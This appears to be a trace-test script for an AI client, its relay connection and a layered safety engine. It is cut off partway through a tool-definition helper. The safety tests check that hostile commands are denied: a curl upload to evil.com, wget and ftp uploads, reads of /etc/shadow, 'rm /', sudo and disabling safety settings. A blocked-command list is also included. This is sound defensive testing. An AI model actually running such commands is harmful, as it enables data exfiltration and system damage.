// Trace test: AI client — connection, auth, heartbeat, messaging, disconnection, safety engine
// Run with: node packages/client-ai/trace-test.mjs

import {
  BastionAiClient,
  AiClientError,
  evaluateLayer1,
  evaluateLayer2,
  createPatternHistory,
  evaluateLayer3,
  evaluateSafety,
  defaultSafetyConfig,
  validateSafetyConfig,
  generateSafetyResponse,
  createToolRegistry,
  createApiKeyManager,
  createAnthropicAdapter,
  ConversationManager,
  MemoryStore,
  ProjectStore,
  validatePath,
  scanContent,
  ToolRegistryManager,
  ChallengeManager,
  BudgetGuard,
  AdapterRegistry,
  SkillStore,
  DataEraser,
} from './dist/index.js';
import {
  BastionRelay,
  generateSelfSigned,
  JwtService,
  AuditLogger,
  AUDIT_EVENT_TYPES,
} from '@bastion/relay';
import { verifyChain } from '@bastion/crypto';
import { PROTOCOL_VERSION, MESSAGE_TYPES, SAFETY_FLOORS, SAFETY_OUTCOMES } from '@bastion/protocol';
import { randomUUID, randomBytes } from 'node:crypto';

let pass = 0, fail = 0;
function check(name, condition, detail) {
  if (condition) { pass++; console.log('  PASS', name); }
  else { fail++; console.log('  FAIL', name, detail || ''); }
}

function delay(ms) {
  return new Promise(r => setTimeout(r, ms));
}

function waitForEvent(emitter, event, timeoutMs = 5000) {
  return new Promise((resolve, reject) => {
    const timer = setTimeout(() => reject(new Error(`Timeout waiting for "${event}"`)), timeoutMs);
    emitter.once(event, (...args) => {
      clearTimeout(timer);
      resolve(args);
    });
  });
}

async function run() {
  console.log('=== AI Client Trace Tests ===');
  console.log();

  // Generate self-signed TLS cert for all tests
  let tls;
  try {
    tls = generateSelfSigned('localhost');
  } catch (err) {
    console.error('SKIP: Cannot generate self-signed cert (OpenSSL required):', err.message);
    console.log('Results: SKIPPED');
    return;
  }

  const jwtSecret = randomBytes(32);
  const jwtService = new JwtService({
    issuer: 'bastion-relay-test',
    secret: jwtSecret,
  });

  // -------------------------------------------------------------------
  // Test 1: Connection to relay
  // -------------------------------------------------------------------
  console.log('--- Test 1: AI client connects to relay ---');
  {
    const port = 19550;
    const relay = new BastionRelay({
      port,
      host: '127.0.0.1',
      tls: { cert: tls.cert, key: tls.key },
    });

    await relay.start();

    const client = new BastionAiClient({
      relayUrl: `wss://127.0.0.1:${port}`,
      identity: { id: 'ai-1', type: 'ai', displayName: 'TestAI' },
      providerId: 'test-provider',
      rejectUnauthorized: false,
    });

    check('initial state disconnected', client.connectionState === 'disconnected');
    check('not connected initially', !client.isConnected);
    check('not authenticated initially', !client.isAuthenticated);
    check('identity correct', client.identity.type === 'ai');
    check('providerId correct', client.providerId === 'test-provider');

    // Track relay connection event
    const relayConnPromise = waitForEvent(relay, 'connection');

    await client.connect();

    check('state is connected', client.connectionState === 'connected');
    check('isConnected true', client.isConnected);
    check('not yet authenticated', !client.isAuthenticated);
    check('jwt is null before auth', client.jwt === null);

    // Relay should see the connection
    const [, connInfo] = await relayConnPromise;
    check('relay saw connection', typeof connInfo.id === 'string');

    // Double connect should throw
    let doubleErr = false;
    try { await client.connect(); } catch (e) { doubleErr = e instanceof AiClientError; }
    check('double connect throws', doubleErr);

    await client.disconnect();
    check('disconnected', client.connectionState === 'disconnected');

    await relay.shutdown();
  }
  console.log();

  // -------------------------------------------------------------------
  // Test 2: Authentication handshake
  // -------------------------------------------------------------------
  console.log('--- Test 2: Authentication handshake ---');
  {
    const port = 19551;
    const relay = new BastionRelay({
      port,
      host: '127.0.0.1',
      tls: { cert: tls.cert, key: tls.key },
    });

    await relay.start();

    const client = new BastionAiClient({
      relayUrl: `wss://127.0.0.1:${port}`,
      identity: { id: 'ai-2', type: 'ai', displayName: 'AuthAI' },
      providerId: 'anthropic-claude',
      rejectUnauthorized: false,
    });

    await client.connect();

    // Issue JWT for this client
    const token = await jwtService.issueToken({
      sub: 'ai-2',
      clientType: 'ai',
      sessionId: 'session-auth-test',
      capabilities: ['execute', 'send', 'receive'],
    });

    // Set token on client (simulating relay sending SessionEstablished)
    const authPromise = waitForEvent(client, 'authenticated');
    client.setToken(token.jwt, token.expiresAt);

    const [authJwt, authExpires] = await authPromise;
    check('authenticated event fired', authJwt === token.jwt);
    check('expiresAt matches', authExpires === token.expiresAt);
    check('state is authenticated', client.connectionState === 'authenticated');
    check('isAuthenticated true', client.isAuthenticated);
    check('jwt stored', client.jwt === token.jwt);
    check('tokenExpiresAt stored', client.tokenExpiresAt === token.expiresAt);

    // Validate the token stored on client
    const validation = await jwtService.validateToken(client.jwt);
    check('stored JWT is valid', validation.valid);
    check('JWT sub matches', validation.valid && validation.claims.sub === 'ai-2');
    check('JWT clientType matches', validation.valid && validation.claims.clientType === 'ai');

    await client.disconnect();
    check('jwt cleared on disconnect', client.jwt === null);
    check('tokenExpiresAt cleared', client.tokenExpiresAt === null);

    await relay.shutdown();
  }
  console.log();

  // -------------------------------------------------------------------
  // Test 3: Heartbeat response (ping/pong)
  // -------------------------------------------------------------------
  console.log('--- Test 3: Heartbeat response ---');
  {
    const port = 19552;
    const relay = new BastionRelay({
      port,
      host: '127.0.0.1',
      tls: { cert: tls.cert, key: tls.key },
      heartbeat: {
        pingIntervalMs: 100,
        pongTimeoutMs: 500,
      },
    });

    await relay.start();

    const client = new BastionAiClient({
      relayUrl: `wss://127.0.0.1:${port}`,
      identity: { id: 'ai-3', type: 'ai', displayName: 'HeartbeatAI' },
      providerId: 'test-provider',
      rejectUnauthorized: false,
    });

    await client.connect();

    check('ping count starts at 0', client.heartbeatPingCount === 0);

    // Wait for several ping cycles
    await delay(500);

    check('ping count > 0', client.heartbeatPingCount > 0);
    check('client still connected', client.isConnected);
    check('relay still has 1 connection', relay.connectionCount === 1);

    // Wait more — client should survive heartbeat checks
    await delay(400);
    check('client survives heartbeat', client.isConnected);
    check('ping count increased', client.heartbeatPingCount > 1);

    await client.disconnect();
    await relay.shutdown();
  }
  console.log();

  // -------------------------------------------------------------------
  // Test 4: Bidirectional messaging
  // -------------------------------------------------------------------
  console.log('--- Test 4: Bidirectional messaging ---');
  {
    const port = 19553;
    const relay = new BastionRelay({
      port,
      host: '127.0.0.1',
      tls: { cert: tls.cert, key: tls.key },
    });

    await relay.start();

    const client = new BastionAiClient({
      relayUrl: `wss://127.0.0.1:${port}`,
      identity: { id: 'ai-4', type: 'ai', displayName: 'MsgAI' },
      providerId: 'test-provider',
      rejectUnauthorized: false,
    });

    // Track relay message
    const relayMsgPromise = waitForEvent(relay, 'message');
    const relayConnPromise = waitForEvent(relay, 'connection');

    await client.connect();
    const [, connInfo] = await relayConnPromise;

    // AI client sends a message to relay
    const testMsg = JSON.stringify({
      id: randomUUID(),
      type: MESSAGE_TYPES.RESULT,
      timestamp: new Date().toISOString(),
      sender: { id: 'ai-4', type: 'ai', displayName: 'MsgAI' },
      correlationId: randomUUID(),
      version: PROTOCOL_VERSION,
      encryptedPayload: 'encrypted-result-data',
      nonce: 'result-nonce',
    });

    const sent = client.send(testMsg);
    check('send returns true', sent);

    const [msgData, msgInfo] = await relayMsgPromise;
    check('relay received message', msgData === testMsg);
    check('message from correct connection', msgInfo.id === connInfo.id);

    // Relay sends message to AI client
    const clientMsgPromise = waitForEvent(client, 'message');
    const relayMsg = JSON.stringify({
      id: randomUUID(),
      type: MESSAGE_TYPES.TASK,
      data: 'task from human via relay',
    });

    relay.send(connInfo.id, relayMsg);
    const [receivedData] = await clientMsgPromise;
    check('AI client received message', receivedData === relayMsg);

    // Send when disconnected returns false
    await client.disconnect();
    check('send when disconnected returns false', !client.send('test'));

    await relay.shutdown();
  }
  console.log();

  // -------------------------------------------------------------------
  // Test 5: Clean disconnection
  // -------------------------------------------------------------------
  console.log('--- Test 5: Clean disconnection ---');
  {
    const port = 19554;
    const relay = new BastionRelay({
      port,
      host: '127.0.0.1',
      tls: { cert: tls.cert, key: tls.key },
    });

    await relay.start();

    const client = new BastionAiClient({
      relayUrl: `wss://127.0.0.1:${port}`,
      identity: { id: 'ai-5', type: 'ai', displayName: 'DisconnectAI' },
      providerId: 'test-provider',
      rejectUnauthorized: false,
    });

    await client.connect();
    client.setToken('test-jwt', new Date(Date.now() + 900000).toISOString());
    check('authenticated before disconnect', client.isAuthenticated);

    // Track disconnection events
    const disconnPromise = waitForEvent(client, 'disconnected');
    const relayDisconnPromise = waitForEvent(relay, 'disconnection');

    await client.disconnect(1000, 'test clean disconnect');

    const [code, reason] = await disconnPromise;
    check('client disconnect event', code === 1000);
    check('disconnect reason', reason === 'test clean disconnect');
    check('state is disconnected', client.connectionState === 'disconnected');
    check('isConnected false', !client.isConnected);
    check('isAuthenticated false', !client.isAuthenticated);

    // Relay saw the disconnection
    const [disconnInfo, disconnCode] = await relayDisconnPromise;
    check('relay saw disconnection', disconnCode === 1000);

    // Double disconnect is safe
    await client.disconnect();
    check('double disconnect safe', client.connectionState === 'disconnected');

    await relay.shutdown();
  }
  console.log();

  // -------------------------------------------------------------------
  // Test 6: Server-initiated disconnect
  // -------------------------------------------------------------------
  console.log('--- Test 6: Server-initiated disconnect ---');
  {
    const port = 19555;
    const relay = new BastionRelay({
      port,
      host: '127.0.0.1',
      tls: { cert: tls.cert, key: tls.key },
    });

    await relay.start();

    const client = new BastionAiClient({
      relayUrl: `wss://127.0.0.1:${port}`,
      identity: { id: 'ai-6', type: 'ai', displayName: 'ServerKickAI' },
      providerId: 'test-provider',
      rejectUnauthorized: false,
    });

    const connPromise = waitForEvent(relay, 'connection');
    await client.connect();
    const [, connInfo] = await connPromise;

    // Server kicks the client
    const disconnPromise = waitForEvent(client, 'disconnected');
    relay.disconnect(connInfo.id, 4000, 'server initiated');

    const [code] = await disconnPromise;
    check('server disconnect received', code === 4000);
    check('client state disconnected', client.connectionState === 'disconnected');

    await relay.shutdown();
  }
  console.log();

  // -------------------------------------------------------------------
  // Test 7: Token refresh timer
  // -------------------------------------------------------------------
  console.log('--- Test 7: Token refresh timer ---');
  {
    const port = 19556;
    const relay = new BastionRelay({
      port,
      host: '127.0.0.1',
      tls: { cert: tls.cert, key: tls.key },
    });

    await relay.start();

    const client = new BastionAiClient({
      relayUrl: `wss://127.0.0.1:${port}`,
      identity: { id: 'ai-7', type: 'ai', displayName: 'RefreshAI' },
      providerId: 'test-provider',
      rejectUnauthorized: false,
      tokenRefreshMs: 200, // Fast refresh for testing
    });

    await client.connect();

    // Set token → should trigger refreshNeeded after 200ms
    const refreshPromise = waitForEvent(client, 'tokenRefreshNeeded', 2000);
    const token = await jwtService.issueToken({
      sub: 'ai-7',
      clientType: 'ai',
      sessionId: 'session-refresh',
      capabilities: [],
    });
    client.setToken(token.jwt, token.expiresAt);

    await refreshPromise;
    check('tokenRefreshNeeded fired', true);

    // Simulate refresh: set new token (resets timer)
    const newToken = await jwtService.issueToken({
      sub: 'ai-7',
      clientType: 'ai',
      sessionId: 'session-refresh',
      capabilities: [],
    });
    client.setToken(newToken.jwt, newToken.expiresAt);
    check('new token set', client.jwt === newToken.jwt);

    await client.disconnect();
    await relay.shutdown();
  }
  console.log();

  // -------------------------------------------------------------------
  // Test 8: Heartbeat audit logging (Task 1.16 verification)
  // -------------------------------------------------------------------
  console.log('--- Test 8: Heartbeat audit logging ---');
  {
    const port = 19557;
    const auditLogger = new AuditLogger({ store: { path: ':memory:' } });

    const relay = new BastionRelay({
      port,
      host: '127.0.0.1',
      tls: { cert: tls.cert, key: tls.key },
      heartbeat: {
        pingIntervalMs: 100,
        pongTimeoutMs: 150,
      },
      auditLogger,
    });

    await relay.start();

    // Connect a client
    const client = new BastionAiClient({
      relayUrl: `wss://127.0.0.1:${port}`,
      identity: { id: 'ai-8', type: 'ai', displayName: 'AuditAI' },
      providerId: 'test-provider',
      rejectUnauthorized: false,
    });

    await client.connect();
    await delay(100);

    // Check that connection was audit-logged
    const connEvents = auditLogger.query({ eventType: AUDIT_EVENT_TYPES.SESSION_STARTED });
    check('connection audit logged', connEvents.length === 1);
    check('connection has connectionId', typeof connEvents[0]?.detail?.connectionId === 'string');

    // Disconnect and check audit
    await client.disconnect();
    await delay(200);

    const disconnEvents = auditLogger.query({ eventType: AUDIT_EVENT_TYPES.SESSION_ENDED });
    check('disconnection audit logged', disconnEvents.length === 1);
    check('disconnect has code', disconnEvents[0]?.detail?.code === 1000);

    // Verify the audit chain is intact
    const chain = auditLogger.getChain();
    check('audit chain entries >= 2', chain.length >= 2);
    const verification = verifyChain(chain);
    check('audit chain valid', verification.valid);

    auditLogger.close();
    await relay.shutdown();
  }
  console.log();

  // -------------------------------------------------------------------
  // Test 9: Connection failure handling
  // -------------------------------------------------------------------
  console.log('--- Test 9: Connection failure handling ---');
  {
    // Connect to non-existent server
    const client = new BastionAiClient({
      relayUrl: 'wss://127.0.0.1:19999',
      identity: { id: 'ai-9', type: 'ai', displayName: 'FailAI' },
      providerId: 'test-provider',
      rejectUnauthorized: false,
      connectTimeoutMs: 2000,
    });

    let connectErr = false;
    try {
      await client.connect();
    } catch (e) {
      connectErr = e instanceof AiClientError;
    }
    check('connection failure throws AiClientError', connectErr);
    check('state returns to disconnected', client.connectionState === 'disconnected');
  }
  console.log();

  // ===================================================================
  // Safety Engine Tests (Tests 10–24)
  // ===================================================================

  /** Helper: create a minimal TaskPayload for testing. */
  function makeTask(overrides = {}) {
    return {
      taskId: randomUUID(),
      action: 'read',
      target: '/app/data/file.txt',
      parameters: {},
      priority: 'normal',
      constraints: [],
      ...overrides,
    };
  }

  // -------------------------------------------------------------------
  // Test 10: L1 — destructive without scope
  // -------------------------------------------------------------------
  console.log('--- Test 10: L1 — destructive without scope ---');
  {
    // delete * without scope → deny
    const r1 = evaluateLayer1(makeTask({ action: 'delete', target: '*' }));
    check('delete * denied', !r1.passed);
    check('category is destructive_without_scope', r1.denialCategory === 'destructive_without_scope');

    // delete with scope → pass
    const r2 = evaluateLayer1(makeTask({ action: 'delete', target: '*', parameters: { scope: 'app' } }));
    check('delete * with scope passes', r2.passed);

    // delete specific file without scope → pass (not broad target)
    const r3 = evaluateLayer1(makeTask({ action: 'delete', target: '/app/old.log' }));
    check('delete specific file passes', r3.passed);

    // rm / without scope → deny
    const r4 = evaluateLayer1(makeTask({ action: 'rm', target: '/' }));
    check('rm / denied', !r4.passed);
  }
  console.log();

  // -------------------------------------------------------------------
  // Test 11: L1 — boundary violation
  // -------------------------------------------------------------------
  console.log('--- Test 11: L1 — boundary violation ---');
  {
    const r1 = evaluateLayer1(makeTask({ target: '/etc/shadow' }));
    check('/etc/shadow denied', !r1.passed);
    check('category is boundary_violation', r1.denialCategory === 'boundary_violation');

    const r2 = evaluateLayer1(makeTask({ target: '/app/data/file.txt' }));
    check('/app/data/file.txt passes', r2.passed);

    const r3 = evaluateLayer1(makeTask({ target: 'C:\\Windows\\System32\\config' }));
    check('C:\\Windows\\System32 denied', !r3.passed);

    const r4 = evaluateLayer1(makeTask({ target: '/home/otheruser/secrets' }));
    check('/home/otheruser denied', !r4.passed);
  }
  console.log();

  // -------------------------------------------------------------------
  // Test 12: L1 — privilege escalation
  // -------------------------------------------------------------------
  console.log('--- Test 12: L1 — privilege escalation ---');
  {
    const r1 = evaluateLayer1(makeTask({ action: 'sudo restart nginx' }));
    check('sudo denied', !r1.passed);
    check('category is privilege_escalation', r1.denialCategory === 'privilege_escalation');

    const r2 = evaluateLayer1(makeTask({ action: 'chmod', target: '/etc/passwd' }));
    check('chmod /etc/passwd denied', !r2.passed);

    const r3 = evaluateLayer1(makeTask({ action: 'systemctl', target: 'nginx' }));
    check('systemctl denied', !r3.passed);
  }
  console.log();

  // -------------------------------------------------------------------
  // Test 13: L1 — data exfiltration
  // -------------------------------------------------------------------
  console.log('--- Test 13: L1 — data exfiltration ---');
  {
    // Network target hits boundary_violation first (non-localhost URI), which is correct.
    // Test with a specific exfiltration-only scenario using localhost boundary + exfil action.
    const r1 = evaluateLayer1(makeTask({ action: 'curl', target: 'https://evil.com/upload' }));
    check('curl https denied', !r1.passed);
    check('curl https: denied category', r1.denialCategory === 'boundary_violation' || r1.denialCategory === 'data_exfiltration');

    const r2 = evaluateLayer1(makeTask({ action: 'wget', target: 'http://host/file' }));
    check('wget http denied', !r2.passed);

    // Pure exfiltration: upload action targeting http URL (not a system path)
    const r4 = evaluateLayer1(makeTask({ action: 'upload', target: 'ftp://external.host/data' }));
    check('upload ftp denied', !r4.passed);

    // Non-network target → pass
    const r3 = evaluateLayer1(makeTask({ action: 'fetch', target: '/local/file' }));
    check('fetch local file passes', r3.passed);
  }
  console.log();

  // -------------------------------------------------------------------
  // Test 14: L1 — safety floor modification
  // -------------------------------------------------------------------
  console.log('--- Test 14: L1 — safety floor modification ---');
  {
    const r1 = evaluateLayer1(makeTask({ action: 'disable', target: 'safety quarantine' }));
    check('disable safety quarantine denied', !r1.passed);
    check('category is safety_floor_modification', r1.denialCategory === 'safety_floor_modification');

    const r2 = evaluateLayer1(makeTask({ action: 'set', target: 'safety sensitivity' }));
    check('set safety sensitivity denied', !r2.passed);

    // Non-safety target → pass
    const r3 = evaluateLayer1(makeTask({ action: 'config', target: 'display theme' }));
    check('config display theme passes', r3.passed);
  }
  console.log();

  // -------------------------------------------------------------------
  // Test 15: L2 — irreversible always challenges
  // -------------------------------------------------------------------
  console.log('--- Test 15: L2 — irreversible always challenges ---');
  {
    const config = defaultSafetyConfig();
    const history = createPatternHistory();

    const r1 = evaluateLayer2(
      makeTask({ action: 'deploy', target: 'production' }),
      config, history,
    );
    check('deploy production triggers', r1.triggered);
    const revFactor = r1.factors.find(f => f.name === 'reversibility');
    check('reversibility factor triggered', revFactor?.triggered === true);
    check('reversibility weight is 3.0', revFactor?.weight === 3.0);

    // Safe action should not trigger reversibility
    const r2 = evaluateLayer2(
      makeTask({ action: 'read', target: '/app/data.txt' }),
      config, history,
    );
    const revFactor2 = r2.factors.find(f => f.name === 'reversibility');
    check('read does not trigger reversibility', revFactor2?.triggered === false);
  }
  console.log();

  // -------------------------------------------------------------------
  // Test 16: L2 — time-of-day + factors
  // -------------------------------------------------------------------
  console.log('--- Test 16: L2 — time-of-day + factors ---');
  {
    const config = defaultSafetyConfig();
    const history = createPatternHistory();

    // Mock 03:00 — within [0, 6) high-risk window
    const at3am = new Date('2026-03-10T03:00:00');
    const r1 = evaluateLayer2(
      makeTask({ action: 'read', target: '/app/data.txt' }),
      config, history, at3am,
    );
    const timeFactor = r1.factors.find(f => f.name === 'time_of_day');
    check('time_of_day triggered at 03:00', timeFactor?.triggered === true);
    check('time_of_day weight >= 1.2', timeFactor?.weight >= 1.2);

    // Mock 14:00 — outside high-risk window
    const at2pm = new Date('2026-03-10T14:00:00');
    const r2 = evaluateLayer2(
      makeTask({ action: 'read', target: '/app/data.txt' }),
      config, history, at2pm,
    );
    const timeFactor2 = r2.factors.find(f => f.name === 'time_of_day');
    check('time_of_day not triggered at 14:00', timeFactor2?.triggered === false);
  }
  console.log();

  // -------------------------------------------------------------------
  // Test 17: L2 — floor enforcement via config validation
  // -------------------------------------------------------------------
  console.log('--- Test 17: L2 — floor enforcement ---');
  {
    // Attempt to lower timeOfDayWeight below floor
    const { config, violations } = validateSafetyConfig({ timeOfDayWeight: 0.5 });
    check('timeOfDayWeight clamped to 1.2', config.timeOfDayWeight === 1.2);
    check('violation reported', violations.length >= 1);
    check('violation parameter is timeOfDayWeight',
      violations.some(v => v.parameter === 'timeOfDayWeight'));
    check('violation requested is 0.5',
      violations.some(v => v.requested === 0.5));

    // Tightening is ok
    const { config: tight, violations: v2 } = validateSafetyConfig({ timeOfDayWeight: 3.0 });
    check('tightening to 3.0 ok', tight.timeOfDayWeight === 3.0);
    check('no violations for tightening', v2.length === 0);

    // highRiskHoursEnd below floor
    const { config: c3, violations: v3 } = validateSafetyConfig({ highRiskHoursEnd: 3 });
    check('highRiskHoursEnd clamped to 6', c3.highRiskHoursEnd === 6);
    check('violation for highRiskHoursEnd', v3.some(v => v.parameter === 'highRiskHoursEnd'));
  }
  console.log();

  // -------------------------------------------------------------------
  // Test 18: L3 — missing parameters
  // -------------------------------------------------------------------
  console.log('--- Test 18: L3 — missing parameters ---');
  {
    // rename without newName → issue
    const r1 = evaluateLayer3(makeTask({ action: 'rename', target: 'file.txt', parameters: {} }));
    check('rename without params incomplete', !r1.complete);
    check('missing_parameter issue', r1.issues.some(i => i.type === 'missing_parameter'));

    // rename with newName → complete
    const r2 = evaluateLayer3(makeTask({
      action: 'rename', target: 'file.txt', parameters: { newName: 'file2.txt' },
    }));
    const hasMissing = r2.issues.some(i => i.type === 'missing_parameter');
    check('rename with newName has no missing_parameter', !hasMissing);

    // copy without destination → issue
    const r3 = evaluateLayer3(makeTask({ action: 'copy', target: 'file.txt', parameters: {} }));
    check('copy without dest incomplete', r3.issues.some(i => i.type === 'missing_parameter'));
  }
  console.log();

  // -------------------------------------------------------------------
  // Test 19: L3 — ambiguous target
  // -------------------------------------------------------------------
  console.log('--- Test 19: L3 — ambiguous target ---');
  {
    const r1 = evaluateLayer3(makeTask({ target: '**/*.log' }));
    check('wildcard target flagged', r1.issues.some(i => i.type === 'ambiguous_target'));

    const r2 = evaluateLayer3(makeTask({ target: 'all' }));
    check('generic "all" flagged', r2.issues.some(i => i.type === 'ambiguous_target'));

    const r3 = evaluateLayer3(makeTask({ target: '/app/specific.txt' }));
    check('specific target passes', !r3.issues.some(i => i.type === 'ambiguous_target'));
  }
  console.log();

  // -------------------------------------------------------------------
  // Test 20: L3 — conflicting constraints
  // -------------------------------------------------------------------
  console.log('--- Test 20: L3 — conflicting constraints ---');
  {
    const r1 = evaluateLayer3(makeTask({ constraints: ['dry-run', 'execute'] }));
    check('dry-run + execute conflicts', r1.issues.some(i => i.type === 'conflicting_constraints'));

    const r2 = evaluateLayer3(makeTask({ constraints: ['verbose'] }));
    check('single constraint no conflict', !r2.issues.some(i => i.type === 'conflicting_constraints'));
  }
  console.log();

  // -------------------------------------------------------------------
  // Test 21: Pipeline — L1 denial short-circuits
  // -------------------------------------------------------------------
  console.log('--- Test 21: Pipeline — L1 denial short-circuits ---');
  {
    const result = evaluateSafety(makeTask({ action: 'delete', target: '*' }));
    check('outcome is deny', result.outcome === 'deny');
    check('decidingLayer is 1', result.decidingLayer === 1);
    check('layer2 is null', result.layerResults.layer2 === null);
    check('layer3 is null', result.layerResults.layer3 === null);
    check('layer1 not passed', result.layerResults.layer1.passed === false);
  }
  console.log();

  // -------------------------------------------------------------------
  // Test 22: Pipeline — full allow path
  // -------------------------------------------------------------------
  console.log('--- Test 22: Pipeline — full allow path ---');
  {
    const result = evaluateSafety(
      makeTask({
        action: 'read',
        target: '/app/data.txt',
        parameters: { format: 'json' },
      }),
      { now: new Date('2026-03-10T14:00:00') },
    );
    check('outcome is allow', result.outcome === 'allow');
    check('decidingLayer is 3', result.decidingLayer === 3);
    check('layer1 passed', result.layerResults.layer1.passed);
    check('layer2 populated', result.layerResults.layer2 !== null);
    check('layer3 populated', result.layerResults.layer3 !== null);
    check('layer2 not triggered', !result.layerResults.layer2.triggered);
    check('layer3 complete', result.layerResults.layer3.complete);
  }
  console.log();

  // -------------------------------------------------------------------
  // Test 23: Pipeline — L2 challenge + L3 still runs
  // -------------------------------------------------------------------
  console.log('--- Test 23: Pipeline — L2 challenge + L3 still runs ---');
  {
    const result = evaluateSafety(
      makeTask({ action: 'deploy', target: 'production', parameters: {} }),
      { now: new Date('2026-03-10T14:00:00') },
    );
    check('outcome is challenge', result.outcome === 'challenge');
    check('decidingLayer is 2', result.decidingLayer === 2);
    check('layer2 populated', result.layerResults.layer2 !== null);
    check('layer2 triggered', result.layerResults.layer2.triggered);
    check('layer3 still populated', result.layerResults.layer3 !== null);
  }
  console.log();

  // -------------------------------------------------------------------
  // Test 24: Config floor enforcement
  // -------------------------------------------------------------------
  console.log('--- Test 24: Config floor enforcement ---');
  {
    // Default config is valid
    const def = defaultSafetyConfig();
    check('default timeOfDayWeight is 1.5', def.timeOfDayWeight === SAFETY_FLOORS.TIME_OF_DAY_WEIGHT_DEFAULT);
    check('default highRiskHoursStart is 0', def.highRiskHoursStart === SAFETY_FLOORS.HIGH_RISK_HOURS_START);
    check('default highRiskHoursEnd is 6', def.highRiskHoursEnd === SAFETY_FLOORS.HIGH_RISK_HOURS_END);
    check('default sensitivity is medium', def.patternDeviationSensitivity === 'medium');

    // Full valid tightened config passes
    const { config: c1, violations: v1 } = validateSafetyConfig({
      timeOfDayWeight: 2.0,
      highRiskHoursEnd: 8,
      patternDeviationSensitivity: 'high',
    });
    check('tightened config ok', v1.length === 0);
    check('tightened weight is 2.0', c1.timeOfDayWeight === 2.0);
    check('tightened end is 8', c1.highRiskHoursEnd === 8);
    check('tightened sensitivity is high', c1.patternDeviationSensitivity === 'high');

    // Invalid sensitivity runtime guard
    const { config: c2, violations: v2 } = validateSafetyConfig({
      patternDeviationSensitivity: 'off',
    });
    check('off sensitivity clamped to low', c2.patternDeviationSensitivity === 'low');
    check('violation for off sensitivity', v2.some(v => v.parameter === 'patternDeviationSensitivity'));
  }
  console.log();

  // ===================================================================
  // Safety Message Generation Tests (Tests 25–28)
  // ===================================================================

  // -------------------------------------------------------------------
  // Test 25: Denial message generation
  // -------------------------------------------------------------------
  console.log('--- Test 25: Denial message generation ---');
  {
    const task = makeTask({ action: 'delete', target: '*' });
    const evaluation = evaluateSafety(task);
    check('outcome is deny', evaluation.outcome === SAFETY_OUTCOMES.DENY);

    const msgId = randomUUID();
    const response = generateSafetyResponse(evaluation, msgId);
    check('response type is denial', response.type === 'denial');
    check('payload has deniedMessageId', response.payload.deniedMessageId === msgId);
    check('payload has deniedTaskId', response.payload.deniedTaskId === task.taskId);
    check('layer is 1', response.payload.layer === 1);
    check('reason is human-readable', response.payload.reason.length > 10 && !response.payload.reason.includes('_'));
    check('detail references the denial', response.payload.detail.length > 20);
    check('detail contains the L1 reason', response.payload.detail.includes('Destructive'));
  }
  console.log();

  // -------------------------------------------------------------------
  // Test 26: Challenge message generation
  // -------------------------------------------------------------------
  console.log('--- Test 26: Challenge message generation ---');
  {
    // deploy to production → irreversible → forced challenge
    const task = makeTask({ action: 'deploy', target: 'production', priority: 'normal' });
    const evaluation = evaluateSafety(task);
    check('outcome is challenge', evaluation.outcome === SAFETY_OUTCOMES.CHALLENGE);

    const msgId = randomUUID();
    const response = generateSafetyResponse(evaluation, msgId);
    check('response type is challenge', response.type === 'challenge');
    check('payload has challengedMessageId', response.payload.challengedMessageId === msgId);
    check('payload has challengedTaskId', response.payload.challengedTaskId === task.taskId);
    check('layer is 2', response.payload.layer === 2);
    check('reason is non-empty', response.payload.reason.length > 0);
    check('riskAssessment mentions score', response.payload.riskAssessment.includes('/'));
    check('riskAssessment mentions triggered factors', response.payload.riskAssessment.includes('triggered'));
    check('suggestedAlternatives is array', Array.isArray(response.payload.suggestedAlternatives));
    check('has at least 1 alternative', response.payload.suggestedAlternatives.length >= 1);
    check('factors is array of triggered', response.payload.factors.length >= 1);

    // Verify factor weight normalisation (all must be 0–1)
    const allWeightsValid = response.payload.factors.every(f => f.weight >= 0 && f.weight <= 1);
    check('all factor weights normalised to [0,1]', allWeightsValid);

    // Verify reversibility factor is present
    const hasReversibility = response.payload.factors.some(f => f.name === 'reversibility');
    check('reversibility factor present', hasReversibility);

    // Verify factor descriptions are human-readable
    const allDescribed = response.payload.factors.every(f => f.description.length > 10);
    check('factor descriptions are human-readable', allDescribed);
  }
  console.log();

  // -------------------------------------------------------------------
  // Test 27: Clarify message generation
  // -------------------------------------------------------------------
  console.log('--- Test 27: Clarify message generation ---');
  {
    // rename without newName → missing_parameter → clarify
    const task = makeTask({ action: 'rename', target: 'file.txt', parameters: {} });
    const evaluation = evaluateSafety(task);
    check('outcome is clarify', evaluation.outcome === SAFETY_OUTCOMES.CLARIFY);

    const msgId = randomUUID();
    const response = generateSafetyResponse(evaluation, msgId);
    check('response type is clarify', response.type === 'clarify');
    check('payload has content', response.payload.content.length > 0);
    check('content mentions clarification', response.payload.content.includes('clarification'));
    check('content describes the issue', response.payload.content.includes('missing parameter'));
    check('content includes suggestion', response.payload.content.includes('Suggestion'));
  }
  console.log();

  // -------------------------------------------------------------------
  // Test 28: Allow returns null payload
  // -------------------------------------------------------------------
  console.log('--- Test 28: Allow returns null payload ---');
  {
    // Safe, complete task → allow
    const task = makeTask({
      action: 'read',
      target: '/app/data/report.csv',
      parameters: { format: 'csv' },
    });
    const evaluation = evaluateSafety(task);
    check('outcome is allow', evaluation.outcome === SAFETY_OUTCOMES.ALLOW);

    const response = generateSafetyResponse(evaluation, randomUUID());
    check('response type is allow', response.type === 'allow');
    check('payload is null', response.payload === null);
  }
  console.log();

  // ===================================================================
  // Provider Adapter Tests (Tests 29–32)
  // ===================================================================

  /** Helper: create a mock Anthropic API response. */
  function mockAnthropicResponse(content, usage = { input_tokens: 100, output_tokens: 50 }) {
    return {
      id: 'msg_' + randomUUID().slice(0, 8),
      type: 'message',
      role: 'assistant',
      content,
      model: 'claude-sonnet-4-20250514',
      stop_reason: 'end_turn',
      usage,
    };
  }

  /** Helper: create a mock fetch function. */
  function createMockFetch(responseBody, status = 200) {
    const calls = [];
    const fn = async (url, init) => {
      calls.push({ url, init });
      return {
        ok: status >= 200 && status < 300,
        status,
        async text() { return JSON.stringify(responseBody); },
        async json() { return responseBody; },
      };
    };
    fn.calls = calls;
    return fn;
  }

  /** Helper: create a test tool definition. */
  function makeToolDef(overrides = {}) {
    return {
      id: 'ssh_command',
      name: 'Execute SSH Command',
      description: 'Run a command on a permitted remote host via SSH',
      inputSchema: {
        type: 'object',
        properties: {
          host: { type: 'string' },
          command: { type: 'string' },
        },
        required: ['host', 'command'],
      },
      permittedHosts: ['naval-app-01', 'naval-app-02'],
      blockedCommands: ['rm -rf', 'dd', 'mkfs', 'passwd'],
      requiresChallenge: false,
      maxExecutionTimeSeconds: 30,
